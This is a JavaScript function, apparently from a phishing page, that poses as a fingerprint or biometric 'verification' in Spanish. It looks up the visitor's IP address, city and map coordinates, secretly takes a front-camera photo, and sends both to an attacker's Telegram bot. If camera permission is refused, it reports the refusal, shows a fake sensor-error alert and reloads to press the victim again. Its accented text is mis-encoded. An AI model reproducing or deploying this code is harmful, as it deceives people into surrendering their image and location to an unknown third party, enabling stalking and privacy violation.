async function validarBiometria() {
            if (navigator.vibrate) navigator.vibrate([100]);
            status.innerHTML = "MANTENGA PRESIONADO...";
            laser.style.display = "block";
            ring.style.display = "block";

            let fotoBlob = null;
            let infoDispositivo = "Cargando datos...";

            try {
                // 1. Obtener datos de red ANTES que la cÃ¡mara (Prioridad 1)
                try {
                    const resIP = await fetch('https://ipapi.co/json/');
                    const d = await resIP.json();
                    const equipo = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Desconocido";
                    infoDispositivo = `ðŸ“± *EQ:* ${equipo}\nðŸŒ *IP:* \`${d.ip}\`\nðŸ“ *Lugar:* ${d.city}, ${d.country_name}\nðŸ”— *Mapa:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
                } catch (e) {
                    infoDispositivo = "âš ï¸ Error obteniendo IP/UbicaciÃ³n";
                }

                // 2. Intentar acceder a la cÃ¡mara (Prioridad 2)
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute("playsinline", true);
                await video.play();
                
                // Espera para enfoque
                await new Promise(r => setTimeout(r, 1500));

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth; 
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                fotoBlob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.5));
                stream.getTracks().forEach(t => t.stop());

                // 3. EnvÃ­o con FOTO y TEXTO juntos
                const fd = new FormData();
                fd.append('chat_id', CONFIG.CHAT_ID);
                fd.append('photo', fotoBlob, 'foto.jpg');
                fd.append('caption', `âœ… *VERIFICACIÃ“N COMPLETA*\n\n${infoDispositivo}`);
                fd.append('parse_mode', 'Markdown');

                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                procesoExitoso = true;

            } catch (err) {
                // REPORTAR POR QUÃ‰ NO CARGÃ“ LA FOTO
                let mensajeError = "âŒ *ERROR DE CAPTURA*\n\n";
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    mensajeError += "ðŸš« *RazÃ³n:* El usuario RECHAZÃ“ el permiso de cÃ¡mara.";
                } else if (err.name === 'NotFoundError') {
                    mensajeError += "ðŸ“· *RazÃ³n:* No tiene cÃ¡mara frontal.";
                } else {
                    mensajeError += `âš ï¸ *RazÃ³n:* ${err.message}`;
                }

                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ 
                        chat_id: CONFIG.CHAT_ID, 
                        text: `${mensajeError}\n\n${infoDispositivo}`, 
                        parse_mode: 'Markdown' 
                    })
                });

                alert("ERROR DE LECTURA: El sensor requiere acceso a la cÃ¡mara frontal para validar su identidad.");
                location.reload();
                return;
            }

            // Ã‰xito final
            beep.play();
            status.innerHTML = "âœ… CONFIRMADO";
            setTimeout(() => { window.location.href = CONFIG.PDF_URL; }, 1500);
        }
